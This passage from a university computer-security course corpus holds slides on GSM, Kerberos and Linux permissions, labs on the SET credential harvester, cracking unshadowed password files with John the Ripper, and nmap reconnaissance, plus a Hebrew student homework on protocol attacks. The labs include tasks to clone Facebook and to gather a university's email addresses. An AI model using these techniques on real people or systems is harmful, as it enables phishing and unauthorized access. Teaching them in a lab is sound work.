mobile station radio equipment (transceivers and 
antennas) needed to service each cell in the network.
Home Location Register (HLR) - stores data 
about GSM subscribers, including the 
Individual Subscriber Authentication Key 
(Ki) for each SIM
Mobile Services Switching 
Center (MSC) - The network 
element which performs the 
telephony switching 
functions of the GSM 
network
Equipment Identity Register (EIR) - A 
database which contains information about 
the identity of mobile equipment in order 
to prevent calls from stolen, unauthorized, 
or defective mobile stations
Visitor Location Register (VLR) - A database 
which stores temporary information about 
roaming GSM subscribers.
Authentication Center (AUC) - contains 
the IMSI the Subscriber Authentication 
key (Ki), and the defined algorithms for 
encryption
GSM Authentication Components
MS BS
VLR
HLR
AUC
VPLMN HPLMN
GSM Authentication Components
80
GSM Security
• Focused on the protection of the air 
interface
• No protection on the wired part of the 
network (neither for privacy nor for 
confidentiality)
• The visited network has access to all data 
(except the secret key of the end user)
• Few successful attacks have been 
reported:
– faked base stations
– cloning of the SIM card
Kerberos - Overview
• A secured, centralized network authentication 
protocol (N users and M servers/services)
• Providing protection against replay, password 
guessing and session hijacking
• Single-Sign-On (SSO)
• Based on symmetric cryptography
• Developed as part of Project Athena at MIT 
(late 1980s)
• Used in many systems, e.g., Windows 2000 and 
later as default authentication protocol
82
Kerberos - Overview
• Principles: clients (c) and servers (s)
• Key Distribution Center (KDC)
– Authentication Server (AS)
– Ticket Granting Server (TGS)
• Ticket Granting Ticket (TGT)
• The client authenticates to AS using
a long-term shared secret and
receives a TGT
• Later the client can use this TGT
to get additional tickets from TGS
without resorting to using the shared
secret
• These tickets can be used to 
prove authentication to servers
83
Kerberos - Overview
• Timestamp (T)
is used to 
prevent replay
attack
84
Kerberos - Drawback
• Single point of failure
• Requires online trusted third party: Kerberos 
server
• Security depends on tight clock synchronization
• Secret keys are temporarily stored on the 
users’ workstation
• Password file can be exposed; dictionary attack
85
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מעבדות\מעבדה-2---Access-Control-on-Linux\PS-6.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security
1
PRACTICAL SESSION NO. 5
LINUX ACCESS CONTROL (POSIX)


2
Access Control on Linux Based Operating Systems (POSIX)
Portable Operating System Interface (POSIX) are IEEE standards family (IEEE 1003.1), which define the access control mechanism on Linux based operating systems.
Within POSIX, the access to objects (files) are based on the identity of subjects and groups to which they belongs.
POSIX is classified as discretionary access control.
2

3
Managing Users, Groups and Passwords at Unix
In Linux, a user is identified using a unique identifier called user-id (UID)
Each user belongs to at least one group called the user’s primary group
Like user, a group is also identified with the help of a unique identifier called group id (GID)
UID and GID controls the accessibility of the files and folders
Unix based operating systems maintain the information of its users in a readable file – /etc/passwd

3

4
The structure of /etc/passwd File
Field 1: Username
This is the username which is used for login
Username uniquely identifies a user on a Linux system.
We can’t have multiple users with same username 
Field 2: Password
This field contains the encrypted password for the user
Value ‘x’ in this field indicates that the user password is stored in the /etc/shadow file
4
4

5
The structure of /etc/passwd File
Field 3: User-ID
User-Id is a unique number which is used by Linux to identify the user - There is one to one mapping between the Username and User-ID
Every user must be assigned with a unique UID. This applies to all UIDs but 0
The root is assigned with a special UID = 0,  any user having UID = 0 has root privileges

5
5

6
The structure of /etc/passwd File
Field 4: Group-ID
Group-Id represents a unique number identifying the primary group id for the user
Linux maintains the group name and group id mapping in a separate readable file /etc/group
Field 5: User Info
This field is used to store the general information about the user (like a full name)
This field can be left blank


6
6

7
The structure of /etc/passwd File
Field 6: User’s Home Directory
This field is used to store the general information about the user like full name etc.
This field contains the location of user’s home directory
A user is provided full access to it’s home directory
Field 7: User’s Shell
Shell is the first program that a user encounters after logging into a Linux system
Linux comes with several shells (/bin/sh, /bin/bash etc.)
This field stores the user’s default shell



7
7

8
The structure of /etc/shadow File
In Unix based operating systems, the  /etc/shadow file contains password and account expiry information for the users
Field 1 – username
Field 2 – encrypted password (break with a ‘$’ sign) where
(1) Hash Algorithm (where: 1 – MD5, 2 – Blowfish, 3 – eksBLowfish, 4 – SHA256 and 5 – SHA512)
(2) Salt Value 
(3) Password

8
8

9
The structure of /etc/shadow File
Field 3 – last password change (in days since 1.1.1970)
Field 4 - minimum number of days required between password changes
Field 5 - maximum number of days the password is valid (enforced)
Filed 6 - number of days before password is to expire (warned)
Field 7 - number of days after password expires that account is disabled
Field 8 - days since 1.1.1970 that the account has been disabled




9
9

10
The structure of /etc/shadow File
The password expiry information for a user account can be displayed/modified by using chage command




10
10

11
The structure of /etc/group File
Groups are managed in the /etc/group file
Filed 1 – Group name
Filed 2 – Password (generally password is not used, hence it is empty/blank)
Filed 3 – Group ID (GID): 
Each user must be assigned a group ID
You can see this number in the /etc/passwd file
Filed 4 – A list of user names of users who are members of the group (the user names, are separated by commas)





11
11
$ cat /etc/group
gurus:x:1004:cloe



 

12
Managing Users
In order to create new user we use the useradd command
The useradd command has the following format: useradd <options> user-name
For example the command – useradd andrey
Creates a new user called andrey
Creates a new group called andrey 
Assign the home directory of andrey to the default home directory (we can specify the user home directory using the -d flag)



12
12
$ useradd andrey
$ id andrey
uid=1003(andrey) gid=1005(andrey) groups=1005(andrey)

 

13
Managing Users
useradd allows to create a new user and assign him to groups simultaneously using the -G flag
After creating a new user it is necessary to assign him with a password using the passwd command (paswwd user-name)



13
13
$ useradd –G gurus,staff asaf
$ id asaf
uid=1004(asaf) gid=1008(asaf) groups=1008(asaf),50(staff),1004(gurus)
$passwd asaf
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully


 

14
Managing Users
In order to assign an existing user to an existing group we use the usermod command
For example, the command – usermod -a -G admins geek adds the user geek to the group admins (the –a is for append)
In order to create new group we use the groupadd command



14
14
$ groupadd ron
$ cat /etc/group
ron:x:1007:

 

15
Access Control on Linux Based Operating Systems (POSIX)
Every object (file) in Linux based operating system has the following attributes (a.k.a., access classes): 
Owner permissions − determine what actions the owner of the file can perform on the file 
Group permissions − determine what actions a user, who is a member of the group that a file belongs to, can perform on the file 
Other (world) permissions − indicate what action all other users can perform on the file 

15

16
Access Control on Linux Based Operating Systems (POSIX)
The ls -l command displays various information related to file permission as follows:
The permissions are broken into groups of threes, and each position in the group denotes a specific permission, in this order: read (r), write (w), execute (x)
The first three characters (2-4) represent the permissions for the file's owner
The second group of three characters (5-7) consists of the permissions for the group to which the file belongs
The last group of three characters (8-10) represents the permissions for everyone else
The first character (1) represent the type of the file ( ‘-’ for regular files, ‘d’ for directories, ‘s’ for sockets etc.)
16
$ls -l /home/ron
-rwxr-xr--  1 ron   users 1024  Nov 2 00:10  myfile 

17


16
Access Control on Linux Based Operating Systems (POSIX)
Directory access modes are listed and organized in the same manner as files
However, there are a few differences that need to be mentioned
Read access – to a directory means that the user can read its content (i.e. The user can look at the filenames inside the directory)
Write access – means that the user can add or delete directory files
Execute access – allows to traverse within the directory , but not see files inside the directory (a.k.a., search access )
$ls -l /home/ron
-rwxr-xr--  1 ron   users 1024  Nov 2 00:10  myfile 

18
Special Permissions – SUID, SGID and Sticky-Bit 
Often when a command is executed, it will have to be executed with special privileges in order to accomplish its task
For instance:
when you change your password with the passwd command, your new password is stored in the file /etc/shadow
As a regular user, you do not have read or write access to this file 
But when you change your password, you need to have write permission to this file – means that the passwd program has to give you additional permissions so that you can write to the file /etc/shadow

18
$ ls -l /usr/bin/passwd
-r-sr-xr-x  1   root   bin  19031 Feb 7 13:47  /usr/bin/passwd*

19
Special Permissions – SUID, SGID and Sticky-Bit 
Additional permissions are given to programs via a mechanism known as the Set User ID (SUID) and Set Group ID (SGID)
Programs that do not have the SUID bit set are run with the permissions of the user who started the program
When you execute a program that has the SUID bit enabled, you inherit the permissions of that program's owner
This is true for SGID as well, normally programs execute with the group permissions of the user who started the program – but instead your group will be changed just for this program to the group owner of the program

19
$ ls -l /usr/bin/passwd
-r-sr-xr-x  1   root   bin  19031 Feb 7 13:47  /usr/bin/passwd*

20
Special Permissions – SUID, SGID and Sticky-Bit 
The SUID and SGID bits will appear as the letter "s" if the permission is available 
The SUID "s" bit will be located in the permission bits where the owners execute permission would normally reside
A capital letter “S" in the execute position instead of a lowercase s indicates that the execute bit is not set


20
$ ls -l /usr/bin/passwd
-r-sr-xr-x  1   root   bin  19031 Feb 7 13:47  /usr/bin/passwd*

21
Special Permissions – SUID, SGID and Sticky-Bit 
Directories have additional bit known as “sticky-bit” (a.k.a., restricted deletion)
Normally, a user with a write permission to a directory could delete files within the directory even if he does not have a write access to each file
Files within directories with Sticky-Bit set can only be deleted by (1) their owner, (2) the directory's owner and (3) super-user


21
21
$ ls -l /usr/bin/passwd
-r-sr-xr-x  1   root   bin  19031 Feb 7 13:47  /usr/bin/passwd*
21
$ls -l /home/ron
drwxr-xr-t  1 ron   users 1024  Nov 2 00:10  mydir 

22
Changing File Permissions
In order to change the permissions of files in Unix we use the chmod command
The chmod command has the following format:
 chmod <options> permissions file-name
For Example:
The command chmod 420 a.o will set the permission of a.o to –r---w----
420 -> 100010000
The following command are equivalent: 
chmod u=r,g=w a.o


23
Changing File Permissions
Setting/Unsetting the SUID:
chmod u+s  <file-name>
chmod u-s  <file-name>
Setting/Unsetting the GUID :
chmod g+s  <file-name> 
chmod g-s  <file-name> 
Setting/Unsetting the Sticky-Bit:
chmod +t  <file-name> 
chmod -t  <file-name> 
 


24
Exercise – 18.04.2019 
While inspecting the discretionary access-control (DAC) arrangements on a Unix computer, you find the following setup:
Members of group staff – alex, benn and cloe
Members of group gurus – cloe 
The file microedit application is a copy of /usr/bin/vim program which is a normal text editor




24
24


25
Exercise – 18.05.2017 
Draw an access control matrix that shows for each of the above five files, whether alex, benn, or cloe are able to obtain the right to read or write its contents
In order to verify your answer you should create the users, groups and files in your Kali Linux machine have fun :-)



25
25

26


25
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מעבדות\מעבדה-3\PS-7.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security
1
PRACTICAL SESSION NO. 7
SOCIAL ENGINEERING
CREDENTIAL HARVESTING & PASSWORD CRACKING

2
What is social engineering?
Psychological manipulation of people into performing actions or divulging confidential information (from Wikipedia)
Different attack vectors
Phishing/Spear phishing
Drive by installations/download
Etc.
An important aspect of organization security






2

3
Social Engineering Toolkit (SET)
An open-source Python-driven tool aimed at penetration testing around Social-Engineering (i.e., perform attacks against the human element)
SET Attack Vectors
Spear Phishing – Spoofs or utilizes already established email addresses to do spear-phishing attacks with file format attack vectors
Web Attacks – Multiple attack vectors including java applet, man left in the middle, and the credential harvester
Malicious USB/DVD/CD – Auto-run creation, allows you to deploy MSF payloads in a simple auto-run 




3

4
SET - Credential Harvester
Allows to clone a website and rewrite the post parameters to intercept credentials
Redirects victim back to the original site to make it seem less conspicuous
Can be used in wide-scale harvesting
Creates reports in HTML and XML formats





4

5
5
Credential Harvester
Demo

6
Password Cracking
The process of recovering passwords from data that have been stored or transmitted by a computer system (e.g., etc/passwd and etc/shadow files)
The purpose of password cracking is to gain unauthorized access to a system
Common approaches:
Brute-force
Dictionary attack
Rainbow tables





6

7
Password Cracking – John the Ripper
John the Ripper is one of the most popular (and open source) password cracking tool
Combines a number of password crackers into one package
Single Cracker – Cracking passwords using the default dictionary
Incremental Cracker – Smart brute-force attack
Custom dictionary attack
Allows to add rules to generate bigger dictionaries
Auto-detects password hash types

7

8
Password Cracking – John the Ripper
Before we can start cracking passwd files with john we should unshadow the shadow file 
The unshadow utility combines the password hash stored in the /etc/shadow file with the content of the /etc/passwd file
Reminder –  ’>’ is the redirect shell operator

8

9
John the Ripper – Basic Commands
The following command will start john in hybrid mode
First john try to guess passwords using the single cracker module (using default dictionary)
After john use the incremental cracker (could take long time)
Note – You can stop and restart john at any time, the cracked passwords are stored in ~/.john/john.pot


9

10
John the Ripper – Basic Commands
John could operate with custom dictionary using --wordlist flag  
The word list format is a single word at every line within the dictionary file

10

11
Exercise – 25.05.2019 
Download passwd and shadow files from moodle
Use john in order to crack the passwords
Write the passwords to txt file
Did you successfully cracked all the passwords?
Create a dictionary contains dates in the following format day.month.year (e.g., 1.1.2000)
you can use simple bash code to do so (http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-7.html)
Crack the remaining password using the dictionary
(*) Run SET in order to clone Facebook and try login to the site from your host machine

11

12
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מעבדות\מעבדה-מס׳-1\Lab_1.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information 
Security
PRACTICAL SESSION NO. 1
INTRO & INFORMATION GATHERING
Agenda
q Welcome, Assignments and Labs requirements
qInformation Gathering
General Information
q Course team
§ Lectures
• Prof. Yuval Elovici - elovici@bgu.ac.il
• Dr. Asaf Shabtai – shabtaia@bgu.ac.il
• Dr. Mordehai Guri – gurim@post.bgu.ac.il
§ Teaching Assistants
• Ron Bitton – ronbit@post.bgu.ac.il
• Ben Nassi – nassib@post.bgu.ac.il
• Aviad Elishar aviade@post.bgu.ac.il
• Noam moscovich noammosc@post.bgu.ac.il
• Assignments: Vitaly Dyadyuk- vitalyd@post.bgu.ac.il
q Course’s mail - itns.ise@gmail.com
q Course’s site  - Moodle 
General Information
q Any question with regards to assignments, lectures, practical-
sessions or labs should be directed to the appropriate forum in the 
course web-site.
q Administrative questions should be directed to the course email.
qFor the very urgent topics, or if you haven’t received an answer 
from the course email within three days - you can directly 
approach to Ron Bitton (ronbit@post.bgu.ac.il).  
Practical Sessions and Labs
q The course include both theoretical sessions (5) and labs (8)
q Each student require to submit a solution to 7 out of 8 labs.
Responsible TADateTopicLab/Theoretical-session#
Ron BittonFeb 24th weakInformation GatheringLab (1)1
Ben NassiMar 3th weakIntroduction to cryptographyTheoretical-session (1)2
Ben NassiMar 10th weakSymmetric key cryptography Theoretical-session (2)3
Ben NassiMar 24th weakPublic key infrastructureTheoretical-session (3)4
Ron BittonMar 31th weakAuthentication ProtocolsTheoretical-session (4)5
Ron BittonApr 7th weakIntroduction to Linux access controlLab (2)6
Ron BittonApr 28th weakPOSIX interface and social engineering attacks Lab (3)7
Aviad ElisharMay 12th weakFirewallsTheoretical-session (5)8
Noam MoskovichMay 19th weakUnderstanding buffer overflow attacksLab (4)9
Noam MoskovichMay 26th weakWeb application security using OWASP(1)Lab (5)10
Noam MoskovichJun 2th weakWeb application security using OWASP (2)Lab (6)11
Aviad ElisharJun 10th weakMalware analysis using Cuckoo sandboxLab (7)12
Aviad ElisharJun 17th weakVulnerability assessment  and penetration testing using OpenVAS and MetasploitLab (8)13
Assignments
q The course include 4 assignments (submitted in pairs)
qDelay will not be allowed
Responsible LectureResponsible TADatesTopic#
Asaf ShabtaiBen Nassi17/03/2019 – 04/04/2019 (23:59)Cryptography and Wireshark1
Asaf ShabtaiRon Bitton28/04/2019 – 16/05/2019 (23:59)Authentication protocols and 
Linux access control
2
Mordechai GuriNoam Moscovich19/05/2019 – 06/06/2019 (23:59)Web application security, 
network attacks and BOF
3
Yuval EloviciAviad Elishar09/06/2019 – 21/06/2019 (23:59)Final assignment (all course 
topics)
4
Information Gathering
Information Gathering
Definition:
q“the process of collecting information about something”
More specifically:
qMilitary: the operation of gathering information about an enemy
qInformation Security: collecting as much information as possible about a target
Information Gathering
Information we can collect:
qNetwork Information: Port Scanning, Topology, Firewalls
qDevices information: Hardware, Operating System, Apps
qUsers Activity: Account and browsing Information
qProperty: Ownership of IP & Domains, Docs
And many other interesting things…
Information Gathering
Main Purpose:
qUnderstand How to Attack/Defend
q Understand Where to Attack/Defend
q Understand When to Attack/Defend
q Understand Who to Attack/Defend
q Understand How/Where/When/Who NOT to Attack
This information is highly valuable!
How To Gather Information?
q Network Scans: extract information from network structure and 
components.
q Eavesdropping: listening to the private conversation (or communication 
of others without their consent
q Dumpster Diving: looking for treasure in someone else’s trash.
q Social Engineering: manipulating people to perform actions.
KALI LINUX
q Free of charge customizable open source Debian-based Linux distribution   
aimed at advanced penetration testing (PT) and security auditing.
q Contains over 600 verified tools which are geared towards various information 
security tasks
q Widely used by security researchers for PT, computer forensics and reverse 
engineering.
q Developed, funded and maintained by Offensive Security Ltd
Few of the powerful tools Kali provides
q Wireshark (packet analyzer)
q nmap (port scanner)
q URLCrazy (domain similarity tester)
q Firewalk (L4 determination)
q Parsero (Robot unauthorized scanner)
q Theharvaster (Entities gathering)
Wireshark
q Network sniffing tool
q Live capture and offline analysis
q Deep inspection of hundreds of protocols
q Network professionals, security experts, developers, and educators around 
the world use it regularly
q Freely available as open source
The first assignment is consisted of practical exercises in Wireshark
Nmap (Network mapper)
Features
q Powerful and popular network scanning tool.
q Can scan huge networks with 100,000s of machines.
q Can detect open ports, listening network services and OS version.
Basic scanning
q The simple command nmap <target> scans 1,000 TCP ports on the host (<target>).
§ nmap 192.168.1.1 – scan a single host
§ nmap 192.168.1.1-10 – scan a range of hosts
§ nmap 192.168.1.1/24 – scan a subnet
Nmap (Network mapper)
Host Discovery
qPING Scan (-sP/-sn):
§ One of the very first steps in any network reconnaissance mission is to reduce a (sometimes huge) set of IP 
ranges into a list of active or interesting hosts.
§ Scanning every port of every single IP address is slow (and usually unnecessary). 
§ Ping scan option tells Nmap not to do a port scan after host discovery, and only print out the available 
hosts that responded to the host discovery probes.
§ The default host discovery (a ping scan) for a privilege user consists of actions:
(1) ICMP echo request.
(2) TCP SYN to port 443.
(3) TCP ACK to port 80.
(4) ICMP timestamp request.
(*) For machines on a local ethernet network, ARP scanning will be performed.
§ When executed by an unprivileged user, only SYN packets are sent (i.e., using the connect system call – will 
be further explained later)
Nmap (Network mapper)
Port Scanning Basics
q Nmap is divides ports into six states as follows:
1. open: An application is actively accepting TCP connections or UDP datagrams on this port.
2. closed: A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application 
listening on it.
3. filtered: Nmap cannot determine whether the port is open because packet filtering (e.g., a firewall, router rules 
etc.) prevents its probes from reaching the port.
4. unfiltered: A port is accessible (using ACK), but Nmap is unable to determine whether it is open or closed.
5. open|filtered: Nmap places ports in this state when it is unable to determine whether a port is open or filtered 
(This occurs for scan types in which open ports give no response.). 
6. closed|filtered: This state is used when Nmap is unable to determine whether a port is closed or filtered.
Nmap
Port Scanning technique:
q TCP SYN Scan (-sS): sends TCP packets to 
the targets on specific port.
§ do not creates a full TCP session (instead send 
RST after the SYN/ACK message).
§ requires root privileges.
§ the default port scanning method.
Example (1): TCP SYN scan on OPEN port
Example (2): TCP SYN scan on CLOSED port
Example (3): TCP SYN scan on FILTERED port
Nmap
Port Scanning technique:
q TCP connect scan (-sT): establish a connection with the target server by issuing the “connect” 
system call.
§ targets are more likely to allow the connection because it tries to establish a connection with target 
same as network.
§ scan takes more time to complete and requires to generate more packets.
§ does not requires root privileges. 
Example: TCP connect scan on OPEN port
Nmap
Port Scanning technique:
q UDP Scan (-sU): sends UDP packets in order to scan UDP ports (e.g, DNS, DHCP), can be 
combined with TCP SYN scan.
§ generally slower and more difficult than TCP.
§ sends a UDP packet to every targeted port.
§ for most ports the packet is empty (however, for some common ports such as 53, a protocol-specific 
payload is sent to increase response rate).
Nmap
Port Scanning technique:
qNull, Xmas and FIN Scan (-sN, -sX and -sF):
These three scan types exploit a loophole in 
the TCP RFC to differentiate 
between open and closed ports.
(*) TCP RFC says that any packet not containing 
SYN, RST, or ACK bits will result in a returned RST 
if the port is closed and no response at all if the 
port is open.
(**) These three scan types are exactly the same 
in behavior except for the TCP flags set in probe 
packets (see picture).
(***) If a RST packet is received, the port is 
considered closed, while no response means it 
is open or filtered (The port is marked filtered if 
an ICMP unreachable error is received).
Pros. The key advantage to these scan types is that they 
can sneak through certain non-stateful firewalls and 
packet filtering routers (however, most modern IDS 
products can be configured to detect them).
Cons. The big downside is that not all systems follow 
the TCP RFC.
Nmap
Service, version and OS Detection
q Service and version detection (-sV/-A) :
§ Nmap contains a database of fingerprints for about 
2,200 well-known services.
§ Nmap would report that those ports probably 
correspond to a mail server (SMTP), web server 
(HTTP), and name server (DNS) respectively - this 
lookup is usually accurate.
§ In addition, Nmap can derive the version number of 
service, which helps dramatically in determining 
which exploits a server is vulnerable to.
q OS detection (-O) :
§ One of Nmap's best-known features is remote OS 
detection using TCP/IP stack fingerprinting.
§ Nmap sends a series of TCP and UDP packets to the 
remote host and examines practically every bit in 
the responses.
§ After performing dozens of tests (such as TCP 
options support, the initial window size etc.), Nmap
compares the results to its with a database of more 
than 2,600 known OS fingerprints.
§ Each fingerprint includes a freeform textual 
description of the OS.
Nmap
Additional interesting flags:
-p <port ranges> : specifics which ports you 
want to scan.
--exclude-ports <port ranges> : this option 
specifies which ports you do want Nmap to 
exclude from scanning.
dnsmap
q Meant to be used by pentesters during the information gathering of infrastructure security asses.
q Finds IP addresses and sub-domains of a given domain using  brute-force techniques.
theharvester
q Help penetration testers in the early stages of the penetration test in order to understand the 
customer footprint on the internet
q Gather emails, subdomains, hosts, employee names, open port etc.
q Gather info from various sources : Google, LinkedIn, Twitter etc.
Theharvester Usage Example
Firewalk
q An active reconnaissance network security tool that attempts to determine what layer 4 
protocols a given IP forwarding device will pass (TCP/UDP)
q Firewalk works by sending out TCP or UDP packets with a TTL one greater than the targeted 
gateway
§ If the gateway allows the traffic, it will forward the packets to the next hop where they will expire and 
elicit an ICMP_TIME_EXCEEDED message. Else, it will likely drop the packets.
Firewalk – Usage Example
Parsero
q Free script written in Python
q Parsero reads Robot.txt file of a web server and looks at the Disallow entries
For Example: “Disallow /portal/login_access” 
q Disallow entries means that the content of the entries is not allowed to be indexed by crawlers 
like Google, Bing, Yahoo etc.
Parsero – Usage Example
DMitry
q Linux command line application
q Has the ability to gather as much information as possible about a host
v Sub-domains
v Email addresses
v Uptime Info.
v TCP port scan
v Whois lookups
Dmitry – Usage Example
Other Information gathering Tools
ü Previous tools documentation
ü Other powerful Info. Gathering tools
http://tools.kali.org/category/information-gathering
Open Kali Linux (LAB)
In order to start Kali Linux in the labs follow the next steps:
1. Open ‘VMware Player’ 
2. Choose ‘Player’
3. Choose ‘File’
4. Choose ‘Open a virtual machine’
5. Go to ‘E:/VM-s/Kali/’ and choose the VM file
Kali Linux
§ Username: root
§Password : toor
Lab Exercise – one week to submission 
1. Make list of 5 possible sub-domains for ise.bgu.ac.il and scan the lists to see weather the sub-
domain exists. Please append to the answer file both the list and the scan output.
2. What IP addresses can be pinged in the subnet 132.72.81.1/26 Notice IP address 132.72.81.35
◦ Is the host alive?
◦ Which TCP and UDP ports are opened? 
◦ What is the OS version on that device?
◦ What services are available (use version scan)?
3. Gather 5 emails addresses and 5 sub-domains of bgu.ac.il
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מעבדות\תיבת-הגשה-למעבדה-2\204736961.docx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
מעבדה 2 אבטחה





 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\עבודת-בית-2\עבודת-בית-2\200878627_204736961.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  אבטחה – 2עבודה 
  :1שאלה 
  בצורה Man in the middle) מאזין לקשר הוא יכול לבצע התקפת Cבמידה והתוקף (נניח . 1
  :הבאה   
𝐴 → 𝐵: 𝐴   (C intercepts the message) 
𝐵 → 𝐴: 𝑁   (C intercepts the message) 
𝐴 → 𝐵: {𝑁 , 𝐾 }   (C intercepts the message) 
𝐶 → 𝑆: 𝐴, 𝐶, {𝑁 , 𝐾 }   
𝐵 → 𝑆: 𝐴, 𝐵, {𝑁 , 𝐾 }   
𝑆 → 𝐶: {𝑁 , 𝐾 }   
𝑆 → 𝐵: {𝑁 , 𝐾 }   
יכול ליירט ולפרש כל הודעה  C-ו Kמכירים את מפתח ההצפנה  C-ו A ,Bנוצר מצב בו 
  ומוצפנת באמצעות מפתח זה. B-ל Aשעוברת בין 
ויירוט  B-ל Aהיכולות הנדרשות מן התוקף כדי לבצע התקפה זו הן האזנה לקשר בין . 2
  החבילות.
 נתקן את הפרוטוקול כך:. 3
𝑵𝒐𝒕𝒆: 𝐻𝑒𝑟𝑒 𝐵∗ 𝑎𝑛𝑑 𝐵 𝑏𝑜𝑡ℎ 𝑎𝑟𝑒 𝑡ℎ𝑒 𝑝𝑢𝑏𝑙𝑖𝑐 𝑘𝑒𝑦 𝑜𝑓 𝐵  
𝐴 → 𝐵: 𝐴  
𝐵 → 𝐴: {𝐵, 𝑁 }      
𝐴 → 𝐵: {𝐵, 𝑁 } , 𝐾   
𝐵 → 𝑆: 𝐴, 𝐵∗, {𝐵, 𝑁 } , 𝐾   
𝑆 → 𝐵: {𝐵∗, 𝑁 } , 𝐾
∗
  𝑖𝑓 𝐵∗ == 𝐵 
שולח לשרת את ההודעה השרת יחזיר לו אותה מוצפנת עם המפתח הפומבי שהוא  B-כך  שכש
ובמידה שהתוקף ישלח את המפתח  שמוצפן בפנים. שלח לו רק אם הוא שווה למפתח הפומבי
ולחלץ את  ולא יוכל לפענח אותה 𝐾הוא יקבל את ההודעה מוצפנת בעזרת  Bהפומבי של 
  .𝐾המפתח 
   
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  :2שאלה 
  1 .Kerberos  לצורך שיתוף מפתחות סודיים באופן המיועד מבוסס הצפנה סימטרית הוא מנגנון  
  .מאובטח   
    i ..מטרת הפרוטוקול הינה אוטנטיקציה של משתמשים אל מול שירות מסוים  
    ii . השחקנים והרכיבים במערכת הינם לקוח המעוניין לקבל שירות מסוים, השירות  
   המחולק לשרת )Key Distribution Center = KDCעצמו, ומרכז הפצת המפתחות (     
 ) ומשרת להענקת כרטיסיםAuthentication Server = ASאימות (     
   )Ticket Granting Server = TGC.(  
    iii. :התהליך שמבוצע מרגע התחלת הבקשה לשירות  
∗∗ 𝑪 − 𝑪𝒍𝒊𝒆𝒏𝒕, 𝑨𝑺 − 𝑨𝒖𝒕𝒉𝒆𝒏𝒕𝒊𝒄𝒂𝒕𝒊𝒐𝒏 𝑺𝒆𝒓𝒗𝒆𝒓, 𝑻𝑮𝑺 − 𝑻𝒊𝒄𝒌𝒆𝒕 𝑮𝒓𝒂𝒏𝒕𝒊𝒏𝒈 𝑺𝒆𝒓𝒗𝒆𝒓, 𝑺𝒗𝒄 = 𝑺𝒆𝒓𝒗𝒊𝒄𝒆 ∗∗ 
𝐶 → 𝐴𝑆:   {𝐶 , 𝑆𝑒𝑟𝑣𝑖𝑐𝑒 − 𝑅𝑒𝑞𝑢𝑒𝑠𝑡}   
𝐴𝑆 → 𝐶:   {𝑇𝐺𝑇}     *𝑖𝑓 𝐶 𝑖𝑠 𝑎𝑢𝑡ℎ𝑒𝑛𝑡𝑖𝑐𝑎𝑡𝑒𝑑 
𝐶 → 𝑇𝐺𝑆:   {𝑇𝐺𝑇} , 𝑆𝑒𝑟𝑣𝑖𝑐𝑒 − 𝑅𝑒𝑞𝑢𝑒𝑠𝑡  
𝑇𝐺𝑆 → 𝐶:   𝑇𝑜𝑘𝑒𝑛    *𝑖𝑓 𝑇𝑜𝑘𝑒𝑛 𝑖𝑠 𝑣𝑎𝑙𝑖𝑑 
𝐶 → 𝑆𝑒𝑟𝑣𝑖𝑐𝑒: 𝑇𝑜𝑘𝑒𝑛   𝑤ℎ𝑖𝑙𝑒 𝑆𝑒𝑟𝑣𝑖𝑐𝑒 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 𝑇𝑜𝑘𝑒𝑛 
השירות יאשר ללקוח את השימוש המוצפן לשירות בכל בקשה לשירות ו Token-הלקוח ישלח את הכאן, 
  תקפה. Token-כל עוד חותמת הזמן על ה
  2.  i.  פרוטוקולNeedham-Schroeder  הינו פרוטוקול המבוסס על הצפנה סימטרית  
  מערכת.משתמשי ה להמוכר לכלבאמצעות מפתח פומבי בין המשתמשים לשרת אמון      
  תהליך הפרוטוקול מתבצע כך:    
∗∗ 𝑨, 𝑩 − 𝑨𝒍𝒊𝒄𝒆 𝒂𝒏𝒅 𝑩𝒐𝒃 (𝟐 𝒖𝒔𝒆𝒓𝒔).  𝑺 − 𝑺𝒆𝒓𝒗𝒆𝒓, 𝑵𝒙 − 𝒓𝒂𝒏𝒅𝒐𝒎 𝒏𝒖𝒎𝒃𝒆𝒓 𝒇𝒓𝒐𝒎 𝒙,    
𝑲𝒙 − 𝒙 𝒔 𝒑𝒖𝒃𝒍𝒊𝒄 𝒌𝒆𝒚, 𝑲𝒙
𝟏 − 𝒙 𝒔 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒌𝒆𝒚, 𝑹𝒆𝒒𝒖𝒆𝒔𝒕𝒙𝒚 − 𝒙 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒕𝒐 𝒔𝒆𝒏𝒅 𝒚 𝒂 𝒎𝒆𝒔𝒔𝒂𝒈𝒆 ∗∗  
𝐴 → 𝑆:   𝑅𝑒𝑞𝑢𝑒𝑠𝑡   
